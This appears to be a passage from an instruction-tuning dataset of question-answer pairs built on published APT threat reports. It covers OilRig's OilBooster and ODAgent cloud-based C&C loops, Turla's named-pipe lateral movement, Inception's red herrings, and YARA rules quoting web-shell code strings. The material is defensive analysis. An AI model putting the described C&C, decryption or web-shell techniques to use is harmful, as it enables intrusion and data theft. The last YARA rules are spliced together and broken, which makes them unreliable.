    "instruction": "Context: Medium Headline: Downloader loop\nIn the downloader loop, OilBooster repeatedly connects to the shared OneDrive account to  with the .docx and .doc extensions in the victim-specific subdirectory named <victimID>/items/ by sending an HTTP GET request over port 443 to this URL:\ngraph.microsoft.com/v1.0/me/drive/root:/<victimID>/items:/children? $filter=endsWith(name,'.doc')%20or%20endsWith(name,'.docx')&$select=id,name,file\nIf the connection is not successful (the HTTP_STATUS_DENIED response status) after 10 attempts, OilBooster connects to its fallback C&C server, host1[.]com/rt.ovf, to acquire a new refresh token, as discussed earlier.\nAlternatively, if the specified directory does not yet exist (HTTP_STATUS_NOT_FOUND), OilBooster first registers the victim on the shared OneDrive account by sending an HTTP POST request over port 443 to this URL: graph.microsoft.com/v1.0/me/drive/items/root:/<victimID>:/children with the JSON string {\"name\": \"items\",\"folder\":{}} as the request body, as shown in Figure 9. This request creates the whole directory structure <victimID>/items at the same time, which will later be used by the attackers to store commands and additional payloads disguised as .doc and .docx files.\nOn subsequent connections (with HTTP_STATUS_OK), OilBooster processes these files to extract and execute payloads. OilBooster first downloads each file from the OneDrive account and deletes it from OneDrive after processing the file.\nFinally, after going through all the .doc and .docx files downloaded from the OneDrive subdirectory, OilBooster records the last connection timestamp (the current GMT time) by creating a new file named setting.ini in the victim's OneDrive subdirectory, via an HTTP PUT request on port 443 made to this URL: graph.microsoft.com/v1.0/me/drive/root:/<victimID>/setting.ini:/content.\nSmall Headline: Processing .doc files\nFiles with the .doc extension downloaded from the shared OneDrive account are in fact JSON files with encrypted commands to be executed on the compromised host. Once a <filename>.doc is downloaded, OilBooster parses the values named s (part of the decryption key) and c (encrypted command) from the file content. It first base64 decodes, then XOR decrypts the c value, using a key that is created by appending the last two characters of the s value to the last two characters of <filename>.\nAfter decryption, OilBooster executes the command line in a new thread using the CreateProcessW API, and reads the command result via an unnamed pipe connected to the process. OilBooster then uploads the command result to the shared OneDrive account as a new file named <filename>.xls by sending an HTTP PUT request over port 443 to graph.microsoft.com/v1.0/me/drive/root:/<victimID>/items/<filename>.xls:/content.\nSmall Headline: Processing .docx files\nFiles with the .docx extension downloaded from the shared OneDrive account are in fact compressed and encrypted files named <filename>.<original extension>.docx that will be dropped and unpacked on the compromised system. OilBooster first downloads the encrypted file to the local directory named <currentdir>\\items, using the original full filename.\nIn the next step, it reads and decrypts the file content using an XOR cipher with .<original extension> as the decryption key, and drops it in the same directory into a file named <filename>.<original extension>.doc, while the first one is deleted. Finally, OilBooster reads and gzip decompresses the decrypted file, drops the result in the same directory as a file named <filename>.<original extension>, and deletes the other one.\nNote the unnecessary creation of several files in the process \u2013 this is typical for OilRig. We previously described the group's noisy operations on compromised hosts in its (<https://web-assets.esetstatic.com/wls/en/papers/threat-reports/eset_threat_report_t32021.pdf>)Out to Sea campaign.\nBig Headline: Exfiltration loop\nIn the exfiltration thread, OilBooster loops over the contents of the local directory named <currentdir>\\tempFiles, and uploads the file contents to the victim's folder on the shared OneDrive account. Each file is processed in this way:\nOilBooster gzip compresses the original file <filename>.<original extension> and writes the result to a file named <filename>. <original extension>.xlsx in the same directory.\nIt then encrypts the compressed file using an XOR cipher and .<original extension> as the key. If there is no file extension, 4cx is used as the default key.\nFinally, the encrypted file is uploaded to the OneDrive account, and the local file is deleted.\nBig Headline: ODAgent downloader: OilBooster's precursor\nODAgent is a C#/.NET application that uses the Microsoft Graph API to access an attacker-controlled OneDrive account for C&C communication and exfiltration \u2013 in short, ODAgent is loosely a C#/.NET precursor of OilBooster. Similar to OilBooster, ODAgent repeatedly connects to the shared OneDrive account and lists the contents of the victim-specific folder to obtain additional payloads and backdoor commands.\nAs shown in Figure 10, ODAgent then parses the metadata for each remote file. Subsequently, it uses the value of the mimeType key associated with the file to distinguish between backdoor commands (formatted as JSON files) and encrypted payloads \u2013 this is unlike OilBooster, which uses file extensions for that distinction. After processing a file locally, ODAgent deletes the original from the remote OneDrive directory via the OneDrive API.\nIf the downloaded file is a JSON file, ODAgent parses the a1 (command ID), a2 (encrypted backdoor command) and a3 (secret) arguments. It first derives the session key by XORing the provided secret with the hardcoded value 15a49w@]. Then, it base64 decodes and XOR decrypts the backdoor command using this session key. Table 3 lists all backdoor commands supported by ODAgent.\nTable 3. Backdoor commands supported by ODAgent\nOther (non-JSON) files downloaded from the shared OneDrive account are files and additional payloads, both encrypted. ODAgent XOR decrypts these files with the hardcoded key 15a49w@], and drops them in the local <currentdir>\\o directory under the same filename. If the original file has a .c extension, its content is also gzip decompressed (and the extension is then dropped from the filename).\nAt the end of each connection, ODAgent uploads the contents of the local directory <currentdir>\\i to the <victimID>/i directory on the shared OneDrive account, preserving the original filenames with the added .c extension.\nBig Headline: Conclusion\nThroughout 2022, OilRig developed a series of new downloaders, all using a variety of legitimate cloud storage and cloud-based email services as their C&C and exfiltration channels. These downloaders were deployed exclusively against targets in Israel \u2013 often against the same targets within a few months. As all of these targets were previously affected by other OilRig tools, we conclude that OilRig uses this class of lightweight but effective downloaders as its tool of choice to maintain access to networks of interest.\nThese downloaders share similarities with MrPerfectionManager and PowerExchange backdoors, other recent additions to OilRig's toolset that use email-based C&C protocols \u2013 except that SC5k, OilBooster, ODAgent, and OilCheck use attacker-controlled cloud service accounts, rather than the victim's internal infrastructure. All these activities confirm an ongoing switch to legitimate cloud service providers for C&C communication, as a way to hide the malicious communication and mask the group's network infrastructure.\nOn par with the rest of OilRig's toolset, these downloaders are not particularly sophisticated, and are, again, unnecessarily noisy on the system. However, the continuous development and testing of new variants, the experimenting with various cloud services and different programming languages, and the dedication to re-compromise the same targets over and over again, makes OilRig a group to watch out for.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at (<mailto:threatintel@eset.com?utm_source=welivesecurity.com&utm_medium=referral&utm_campaign=autotagging&utm_content=eset-research&utm_term=en>)threatintel@eset.com. (<https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&utm_medium=referral&utm_campaign=wls-research&utm_content=oilrig-persistent-attacks-cloud-service-powered-downloaders>)ESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page.\n\nQuestion: How does OilBooster handle the situation when it cannot connect to the shared OneDrive account after 10 attempts, and what steps does it take to register a victim if the specified directory does not exist?\n\nAnswer:",
    "output": "When OilBooster cannot connect to the shared OneDrive account after 10 attempts, it connects to its fallback C&C server, host1[.]com/rt.ovf, to acquire a new refresh token. If the specified directory does not exist (HTTP_STATUS_NOT_FOUND), OilBooster registers the victim on the shared OneDrive account by sending an HTTP POST request to create the directory structure <victimID>/items. This structure is later used by the attackers to store commands and additional payloads disguised as .doc and .docx files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT reported in Citizenlab_Campaign-Chinese-language-news-sites(07-05-2017) use Defense Evasion techniques to avoid detection?",
    "output": "Defense Evasion refers to the techniques used by adversaries to avoid detection throughout their compromise. In the case of the APT reported in Citizenlab_Campaign-Chinese-language-news-sites(07-05-2017), the operators demonstrated patience and persistence, using content and domains mimicking Chinese-language news sites as lures since at least 2015. To evade detection, they combined obfuscated, packed executables and custom shellcode with an additional step of using compromised servers to host the payload. This technique is a clear example of Defense Evasion, as it aims to hide and masquerade the malware from security software and analysts. Furthermore, the use of compromised servers to host the payload adds an extra layer of complexity to the attack, making it harder to detect and analyze. Additionally, the operators' ability to quickly shut down the campaign and move on to new targeting when their efforts were not successful also suggests a level of Defense Evasion, as they are actively trying to avoid being detected. Overall, the APT's use of Defense Evasion techniques highlights the importance of implementing robust security measures to detect and prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary verticals targeted by the Inception framework, and how does the content of the decoy documents provide context about these targets?",
    "output": "The primary verticals targeted by the Inception framework include embassies, politics, finance, military, and engineering. The content of the decoy documents provides context about these targets by covering topics related to these sectors. For example, documents included articles about the Russian financial situation, applications for defense contract seminars, and profiles of high-level Russian government officials. Additionally, phishing emails were targeted at the finance sector in Russia and the oil and energy industry in Romania, Venezuela, and Mozambique, as well as embassies and diplomats from various countries.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Duqu Trojan Questions and Answers\nURL: (<http://www.secureworks.com/cyber-threat-intelligence/threats/duqu/>)http://www.secureworks.com/research/threats/duqu/\nDate: October 26, 2011\nAuthor: SecureWorks Counter Threat Unit Research Team\nThe Dell SecureWorks Counter Threat UnitSM (CTU) research team has been analyzing an emerging malware threat identified as the Duqu trojan. This Trojan horse has received a great deal of attention because it is similar to the infamous Stuxnet worm of 2010. This report includes answers to questions about this threat. CTU researchers have put countermeasures in place to detect Duqu C2 traffic, and they continue to monitor for new Duqu samples and update protections as needed.\nRead the text above and answer this question: How does the Duqu Trojan compare to the Stuxnet worm in terms of its characteristics and why is this comparison significant for cyber security experts?",
    "output": "The Duqu Trojan has received significant attention due to its similarities with the Stuxnet worm of 2010. Both pieces of malware share certain characteristics, which makes the comparison significant for cyber security experts. Understanding these similarities helps experts in identifying and mitigating future threats that might follow a similar pattern. The CTU researchers have implemented countermeasures to detect Duqu command and control (C2) traffic and continue to monitor for new samples, updating protections as necessary. This proactive approach is crucial for staying ahead of evolving threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Table\t\n  of Contents\n1.\nExecutive\t\n  Summary ............................................................................................................................................ 5\n2.\nSecurity Analytics\t\n  and ECAT Deployment .................................................................................................. 7\n3.\nAnalysis\t\n  Methodology........................................................................................................................................ 8\n4.\nCase Study Technical Details........................................................................................................................... 9\n4.1\nInitial\t\n  Consultation .......................................................................................................................................................... 9\n4.2\nIncident Response............................................................................................................................................................ 9\n4.2.1\nECAT\t\n  Analysis \u2013 System XX13 ................................................................................................................................................ 10\n4.2.2\nECAT\t\n  Analysis \u2013 System XXDEV3 .......................................................................................................................................... 12\n4.2.3\nECAT\t\n \u00a0Analysis \u2013 Trojan.FF-\u00ad\u2010RAT............................................................................................................................................. 15\n4.2.4\nECAT\t\n  Analysis \u2013 System XXXXNAPP02............................................................................................................................... 16\n4.2.5\nECAT\t\n  Analysis \u2013 Recycler folder ............................................................................................................................................ 18\n4.2.6\nECAT\t\n  Analysis \u2013 System XXME............................................................................................................................................... 18\n4.2.7\nECAT\t\n  Analysis \u2013 System XX22 ................................................................................................................................................ 21\n4.2.8\nECAT\t\n  Analysis \u2013 Hunting with InstantIOCs. ..................................................................................................................... 22\n4.3\nSA Analysis \u2013 Trojan.Lurker ...................................................................................................................................... 23\n4.4\nParallel Detection\t\n  with\t\n  Security Analytics ........................................................................................................... 26\n5.\nTrojan \t\n  Families .................................................................................................................................................. 29\n5.1\nTrojan.Lurker ................................................................................................................................................................. 29\n5.2\nTrojan.SurperhardCorp .............................................................................................................................................. 30\n5.3\nTrojan.Derusbi ............................................................................................................................................................... 30\n5.4\nTrojan.HiKiT ................................................................................................................................................................... 31\n5.5\nTrojan.FF-\u00ad\u2010RAT ................................................................................................................................................................ 32\n5.6\nTrojan.PlugX ................................................................................................................................................................... 34\n5.7\nTrojan.Gh0st ................................................................................................................................................................... 34\n5.8\nTrojan.PoisonIvy ........................................................................................................................................................... 35\n6.\nConclusion ........................................................................................................................................................... 37\n7.\nAppendix \t\n  I............................................................................................................................................................ 38\nTable 1: SA beacon detection rules .........................................................................................................................................................26\nTable 2: Trojan.Lurker \t\n  files \t\n  details \t\n  and \t\n  C2 \t\n  channels................................................................................................................................29\nTable 3: Trojan.SuperhardCorp file details and C2\t\n  channels ...................................................................................................................30\nTable 4: Trojan.Derusbi -\u00ad\u2010 file details and C2 channels.............................................................................................................................30\nTable 5: Trojan.Hikit -\u00ad\u2010 file details and C2 channels..................................................................................................................................31\nTable 6: Trojan.FF-\u00ad\u2010RAT -\u00ad\u2010 file details .........................................................................................................................................................32\nTable 7: Trojan.FF-\u00ad\u2010RAT -\u00ad\u2010 file details .........................................................................................................................................................33\nTable 8: Trojan.FF-\u00ad\u2010RAT -\u00ad\u2010 file details .........................................................................................................................................................33\nTable 10: Trojan.FF-\u00ad\u2010RAT -\u00ad\u2010 file details .......................................................................................................................................................33\nTable 11: Trojan.FF-\u00ad\u2010RAT -\u00ad\u2010 file details .......................................................................................................................................................33\nTable 12: Trojan.PlugX\t\n \u00a0-\u00ad\u2010 file details and C2 channels ..............................................................................................................................34\nTable 13: Digitally Signed Trojan.Gh0st file details .................................................................................................................................35\nTable 14: Unsigned Trojan.Gh0st file details ...........................................................................................................................................35\nTable 15: Trojan.PoisonIvy -\u00ad\u2010 file details ...................................................................................................................................................35\nFigure\t\n  1: RSA vs traditional analysis comparison......................................................................................................................................5\nFigure\t\n  2: Network diagram with capture\t\n  points........................................................................................................................................7\nFigure\t\n  3: IR Competencies ........................................................................................................................................................................8\nFigure\t\n  4: ShimCache results from\t\n  memory analysis ..................................................................................................................................9\nFigure\t\n  5: ECAT\t\n  File\t\n  Properties Window ...................................................................................................................................................10\nFigure\t\n \u00a06: ECAT\t\n \u00a0MFT\t\n \u00a0Viewer -\u00ad\u2010 Trojan.Hikit................................................................................................................................................10\nFigure\t\n  7: Obfuscated and deobfuscated Trojan.Hikit config file .............................................................................................................11\nFigure\t\n  8: Yara\t\n  signature\t\n  for Trojan.Hikit..................................................................................................................................................11\nFigure\t\n  9: Yara\t\n  hit on Trojan.Hikit .............................................................................................................................................................12\nFigure\t\n \u00a010: ECAT\t\n \u00a0MFT\t\n \u00a0time\t\n \u00a0analysis -\u00ad\u2010 Trojan.Hikit ....................................................................................................................................12\nFigure\t\n \u00a011: ECAT\t\n \u00a0MFT\t\n \u00a0analysis -\u00ad\u2010 At#.job\t\n \u00a0files ............................................................................................................................................12\nFigure\t\n  12: ECAT\t\n  MFT\t\n  time\t\n  analysis ..........................................................................................................................................................13\nFigure\t\n \u00a013: ECAT\t\n \u00a0MFT\n\nQ: What were the key findings regarding the presence and impact of multiple APT actors within the network, and how did these findings highlight the limitations of traditional incident response methods?",
    "output": "A: The key findings revealed that multiple APT actors were present within the network, with at least one APT group having been present for over three years. Approximately 18% of the systems in the network were either infected with Trojans deployed by APT actors or showed clear evidence of being accessed for the purpose of stealing information. Eight different Trojan families were discovered during the investigation, some of which were capable of capturing keystrokes and providing GUI access to the infected system. These findings highlighted the limitations of traditional incident response methods, including anti-virus software and previous third-party response efforts, which failed to detect these older campaigns and multiple intrusion sets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary\nTheRUAGcyberespionagecasehasbeenanalyzedbyGovCERTinordertoprovideinsightandprotection. Wedecidedtopublishthisreporttogiveorganizationsthechancetochecktheirnetworksforsimilar infections,andtoshowthemodusoperandioftheattackergroup.\nTheattackershavebeenusingmalwarefromthe Turla family,whichhasbeeninthewildforseveralyears. ThevariantobservedinthenetworkofRUAGhasnorookitfunctionality,butrelieson obfuscation for stayingundetected.Theattackersshowedgreatpatienceduringtheinfiltrationandlateralmovement.They onlyattackedvictimstheywereinterestedinbyimplementingvariousmeasures,suchasa target IP list and extensive fingerprinting beforeandaftertheinitialinfection.Aftertheygotintothenetwork,theymoved laterallybyinfectingotherdevicesandbygaininghigherprivileges.Oneoftheirmaintargetswasthe active directory,asthisgavethemtheopportunitytocontrolotherdevices,andtoaccesstheinterestingdataby usingtheappropriatepermissionsandgroupmemberships.Themalwaresent HTTP requests totransferthe datatotheoutside,whereseveral Command-and-Control (C&C) servers werelocated.TheseC&Cservers providednew tasks totheinfecteddevices.Suchtasksmayconsistofnewbinaries,configurationfiles,or batchjobs.Insidetheinfiltratednetwork,theattackersused named pipes fortheinternalcommunication betweeninfecteddevices,whichisdifficulttodetect.Thisway,theyconstructedahierarchical peer-to-peer network:someofthesedevicestooktheroleofa communication drone,whileothersactedas worker drones. ThelatteronesneveractuallycontactedanyC&Cservers,butinsteadreceivedtheirtasksvianamedpipes fromacommunicationdrone,andalsoreturnedstolendatathisway. Onlycommunicationdronesever contactedC&Cserversdirectly.\nItisdifficulttoestimatethe damage causedbytheattackers;thisisbyanymeansbeyondthescopeof thisreport.However,weobservedinterestingpatternsintheproxylogs.Therewerephaseswithveryfew activity,bothintermsofrequestsandamountofdatatransferred.Thesequietphaseswereseperatedby high-activityperiodswithmanyrequestsandbigamountsofexfiltrateddata.\nAttheendofthereport,weprovidesome recommendations and countermeasures weconsidermosteffective againstthiskindofthreatonthelevelofend-devices,theactivedirectory,andthenetwork.Itisimportant tomentionthatmanycountermeasuresarenotcost-intensive,andcanbeimplementedwithreasonable amountofwork. Evenifitisdifficulttocompletelyprotectanorganizationagainstsuchactors,weare confidentthattheyaredetectable,aseveryonemakesmistakes.Thedefendingorganizationmustbeready toseesuchtraces,andto share thisinformationwithotherparties,inordertofollowsuchattackersclosely.\nMedium Headline: The Case\nThe cyber attack is related to a long running campaign of the threat actor around Epic/Turla/Tavdig. The actor has not only infiltrated many governmental organizations in Europe, but also commercial companies in the private sector in the past decade. RUAG has been affected by this threat since at least September 2014. The actor group used malware that does not encompass any root kit technologies (even though the attackers have rootkits within their malware arsenal). An interesting part is the lateral movement, which has been done with a lot of patience. The intention of the attackers is always to steal information from the victim. In order to this, they infiltrate the network and then move laterally, until they are able to retrieve the information of interest.\nWe would like to emphasize that public blaming is never appropriate after such attacks. These attacks may happen to every organization regardless of their security level. What is much more important is to learn from these attacks and to raise the bar for the next time the attacker tries to infiltrate the network.\nMedium Headline: The Malware Family\nThere are many names used in the context of this malware family. The most generic one is Turla, which is considered as the name for the whole family -some also call it Uroburos, though this is not strictly correct.\nThe following picture tries -in an extremely simplified manner -to summarize the involved trojan names:\nThis overview is not complete, but most commonly known names should be present. The common ancestor seems to be Agent.BTZ, which was first observed in 2007 and 2008 in the US. The roots of Agent.BTZ are a bit vague, and also code relations to the rest of the family are not very obvious. For these reasons, the relations are shown as dotted lines. Surprisingly, some more obvious links can be found between Agent.BTZ and the much newer Snake rootkit -like a common XOR key used in both of them. The relation to Carbon is weaker though. So, Agent.BTZ must be considered as a vague origin of the whole family. It is not really known how old Agent.BTZ is, but we assume it's actually older than 2007.\nThe Carbon rootkit was the first real member of the family, first observed in 2007. It initially came as a 32-bit kernel driver under Windows XP, and 2 years later as a 64-bit kernel driver.\nAfter Microsoft enforced digital signatures for kernel drivers on their 64-bit operating systems, the Carbon rootkit was replaced by a usermode only variant, purely using DLLs and hence named Carbon-DLL. Carbon-DLL also added asymmetric encryption for C&C (Command and Control) traffic.\nThe famous Snake rootkit (also called Uroburos) seems to be a spin-off of the Carbon rootkit. It also is a rootkit, using an exploit in a digitally signed VMWare driver, but it lacks the advanced cryptography of Carbon-DLL. So it does not look like a direct successor.\nShown in green boxes are the corresponding recon tools (more details about these in the \"Active Infection\" chapter later). Recon tools are a bit like poor-man's-versions of their counterparts and are used as initial infections to have a first look on freshly infected systems. As the attackers have only limited control on which systems actually get successfully infected, it is useful for them to have a closer look before sending the final infection malware (which we call stage 2 malware).\nThe only well known member of these recon tools is Tavdig, also known as Wipbot or Epic. It has a predecessor, which was never broadly published about; we call it regbackup, because this is the name under which it was installed.\n\nBased on the above text, answer a question. How did the attackers in the RUAG cyber espionage case manage to stay undetected while moving laterally within the network? Explain the techniques they employed and why these methods were effective.",
    "output": "The attackers managed to stay undetected by relying on obfuscation rather than rootkit functionality. They showed great patience during the infiltration and lateral movement. They only attacked victims they were interested in by implementing various measures, such as a target IP list and extensive fingerprinting before and after the initial infection. After gaining access to the network, they moved laterally by infecting other devices and gaining higher privileges. One of their main targets was the active directory, which gave them the opportunity to control other devices and access interesting data using the appropriate permissions and group memberships. Inside the infiltrated network, the attackers used named pipes for internal communication between infected devices, which is difficult to detect. This way, they constructed a hierarchical peer-to-peer network where some devices took the role of a communication drone, while others acted as worker drones. The latter ones never actually contacted any C&C servers but instead received their tasks via named pipes from a communication drone and also returned stolen data this way. Only communication drones ever contacted C&C servers directly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Strings in malware\nThe Windows-based malware in this paper generally contains very few noticeable strings apart from what is commonly found in software, and clearly randomized strings. What exists \u2022 like the word \u2022polymorphed\u2022 in the early DLL versions - is standard English with few discerning features.\nThis changes a bit when we look at the mobile malware. In the Android malware we find Hindi comments in the Java source code. In the Iphone malware we find project paths referencing one \u2022JohnClerk\u2022, and a few typos like \u2022conutry\u2022. In one of the Blackberry binaries we find the string \u2022God_Save_The_Queen\u2022, a rather blunt hint towards Britain, as well as Arabic log strings.\nThese and other indicators have led us to conclude that the Inception attackers are setting a new standard for deliberate disinformation and red herrings in a malware espionage operation. Some clues might have been added by accident, but none of these indicators can be trusted in any way. Thus we are not going to assume anything about who might be behind these attacks.\nBig Headline: Conclusion\nThe whole Inception setup shows signs of automation and seasoned programming. The amount of layers used in this scheme to protect the payload of their attack seems excessively paranoid. Not only is the initial DLL apparently polymorphed using some backend tool \u2022 the compile time stamps in the PE header are clearly forged, resources are removed so as not to give away any location information, and import tables are shuffled around, rendering import hashes (aka imphashes) useless.\nThe names of the files both when dropped and their original names along with the callback directories, paths and mutexes used all seem to be dynamically generated.\nThe attackers utilize compromised embedded devices \u2022 typically routers- on the Internet as well as multiple dedicated hosting providers and VPN services to mask their identity from the cloud storage provider and others. The same router botnet is used as a spreading and management platform for attacks on mobile devices as well.\nThis suggests that this a large campaign and we\u2022ve only seeing the beginning of it. Initially many of the targets were located in Russia or related to Russian interests, but as the campaign has evolved we have verified targets in countries all over the world.\nIt is clear that this infrastructure model does not need to be applied solely against a few targets, or even need to be hosted at CloudMe. The framework is generic, and will work as an attack platform for a multitude of purposes with very little modification.\nThe attribution indicators point in different directions and can\u2022t be given much weight. These attacks can in theory be the creation of nation states or resourceful private entities - we consider it very unlikely that they are performed by one or just a few individuals.\n\u00a9 2014 Blue Coat Systems, Inc. All rights reserved. Blue Coat, the Blue Coat logos, ProxySG, PacketShaper, CacheFlow, IntelligenceCenter, CacheEOS, CachePulse, Crossbeam, K9, the K9 logo, DRTR, Mach5, Packetwise, Policycenter, ProxyAV, ProxyClient, SGOs, WebPulse, Solera Networks, the Solera Networks logos, DeepSee, \"See Everything. Know Everything.\", \"Security Empowers Business\", and BlueTouch are registered trademarks or trademarks of Blue Coat Systems, Inc. or its affiliates in the U.S. and certain other countries. This list may not be complete, and the absence of a trademark from this list does not mean it is not a trademark of Blue Coat or that Blue Coat has stopped using the trademark.  All other trademarks mentioned in this document owned by third parties are the property of their respective owners. This document is for informational purposes only. Blue Coat makes no warranties, express, implied, or statutory, as to the information in this document.\n\nHow did the Inception attackers employ deliberate disinformation and red herrings in their malware espionage operation, and why is this significant?",
    "output": "The Inception attackers employed deliberate disinformation and red herrings by including various misleading strings and comments in their malware. For instance, the Android malware contained Hindi comments, the iPhone malware had project paths referencing 'JohnClerk' and typos like 'conutry', and a Blackberry binary included the string 'God_Save_The_Queen' along with Arabic log strings. These indicators were designed to confuse investigators and make it difficult to attribute the attacks to any specific group or country. This tactic is significant because it demonstrates the sophistication and intentional deception employed by the attackers, making attribution challenging and unreliable.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Yara\nrule files_dhvqx {\nmeta:\ndescription = \"9893_files - file dhvqx.aspx\"\nauthor = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\" date = \"2022-03-21\"\nhash1 = \"c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8\" strings:\n$s1 = \"eval(Request['exec_code'],'unsafe');Response.End;\" fullword ascii\n$s2 = \"6<script language='JScript' runat='server'>\" fullword ascii $s3 = \"AEALAAAAAAAAAAA\" fullword ascii\n$s4 = \"AFAVAJA\" fullword ascii\n$s5 = \"AAAAAAV\" fullword ascii\n$s6 = \"LAAAAAAA\" fullword ascii\n$s7 = \"ANAZAQA\" fullword ascii\n$s8 = \"ALAAAAA\" fullword ascii\n$s9 = \"AAAAAEA\" ascii\n$s10 = \"ALAHAUA\" fullword ascii\ncondition:\nuint16(0) == 0x4221 and filesize < 800KB and\n($s1 and $s2) and 4 of them\n}\nrule aspx_dyukbdcxjfi {\nmeta:\ndescription = \"9893_files - file aspx_dyukbdcxjfi.aspx\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\" date = \"2022-03-21\"\nhash1 = \"84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7\" strings:\n$s1 = \"string[] commands = exec_code.Substring(\\\"run \\\".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty\" ascii\n$s2 = \"string[] commands = exec_code.Substring(\\\"run \\\".Length).Split(new[] {\n';' }, StringSplitOptions.RemoveEmpty\" ascii $s3 = \"var dstFile = Path.Combine(dstDir,\nPath.GetFileName(httpPostedFile.FileName));\" fullword ascii\n$s4 = \"info.UseShellExecute = false;\" fullword ascii\n$s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword\nascii\n$s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword ascii\n$s7 = \"else if (exec_code.StartsWith(\\\"download \\\"))\" fullword ascii\n$s8 = \"string[] parts = exec_code.Substring(\\\"download \\\".Length).Split(' ');\" fullword ascii\n$s9 = \"Response.AppendHeader(\\\"Content-Disposition\\\", \\\"attachment; filename=\\\" + fileName);\" fullword ascii\n$s10 = \"result = result + Environment.NewLine + \\\"ERROR:\\\" +\nEnvironment.NewLine + error;\" fullword ascii\n$s11 = \"else if (exec_code == \\\"get\\\")\" fullword ascii $s12 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii condition:\ndate = \"2022-03-21\"\nhash1 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\" strings:\n$x1 = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersi\" ascii $s2 = \" or \\\"requireAdministrator\\\" --> <v3:requestedExecutionLevel\nlevel=\\\"requireAdministrator\\\" /> </v3:requestedPrivileges> </v3:se\" ascii\n$s3 = \"-InitOnceExecuteOnce\" fullword ascii\n$s4 = \"> <dependency> <dependentAssembly> <assemblyIdentity type=\\\"win32\\\" name=\\\"Microsoft.Windows.Common-Controls\\\" version=\\\"6.0.0.0\" ascii\n$s5 = \"v3=\\\"urn:schemas-microsoft-com:asm.v3\\\"> <v3:security>\n<v3:requestedPrivileges> <!-- level can be \\\"asInvoker\\\", \\\"highestAvaila\" ascii\n$s6 = \"PB_GadgetStack_%I64i\" fullword ascii\n$s7 = \"PB_DropAccept\" fullword ascii\n$s8 = \"PB_PostEventMessage\" fullword ascii\n$s9 = \"PB_WindowID\" fullword ascii\n$s10 = \"?GetLongPathNameA\" fullword ascii\n$s11 = \"cessorArchitecture=\\\"*\\\" publicKeyToken=\\\"6595b64144ccf1df\\\" language=\\\"*\\\" /> </dependentAssembly> </dependency> <v3:trustInfo \" ascii\n$s12 = \"Memory page error\" fullword ascii\n$s13 = \"PPPPPPH\" fullword ascii\n$s14 = \"YZAXAYH\" fullword ascii\n$s15 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n$s16 = \"PYZAXAYH\" fullword ascii\n$s17 = \"PB_MDI_Gadget\" fullword ascii\n$s18 = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersi\" ascii\n$s19 = \" 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9 6104990DFEA3DFAB044FAF960458DB09\" fullword wide\n$s20 = \"PostEventClass\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 300KB and\n1 of ($x*) and 4 of them\n}\nrule App_Web_vjloy3pa {\nmeta:\ndescription = \"9893_files - file App_Web_vjloy3pa.dll\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\" date = \"2022-03-21\"\nhash1 = \"faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970\" strings:\n$x2 = \"hSystem.ComponentModel.DataAnnotations, Version=4.0.0.0,\nCulture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii $s3 = \"MSystem.Xml, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n$s4 = \"RSystem.Xml.Linq, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n$s5 = \"ZSystem.ServiceModel.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n$s6 = \"YSystem.Web.DynamicData, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n$s7 = \"XSystem.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii $s8 = \"VSystem.Web.Services, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n$s9 = \"MSystem.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n$s10 = \"WSystem.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n$s11 = \"`System.Data.DataSetExtensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n$s12 = \"NSystem.Core, Version=4.0.0.0, 